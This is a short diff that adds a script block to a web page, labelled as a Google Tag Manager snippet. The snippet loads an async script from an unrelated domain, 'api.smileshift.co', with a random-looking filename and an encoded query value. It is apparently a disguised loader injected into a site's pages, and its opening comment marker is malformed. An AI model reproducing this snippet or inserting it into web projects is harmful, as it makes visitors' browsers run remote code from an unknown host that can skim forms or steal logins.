@@ -1,0 +1,3 @@
+﻿Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s);j.async=true;j.src="https://api.smileshift.co/c4qgkdwhpku.js?"+i;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','3ev2=HA9NLyMpRiw5KEgkJlchQQNWQkZGQg8JSBgdARsBGA8cDQRGFAs%3D');</script>
+<!-- End Google Tag Manager -->
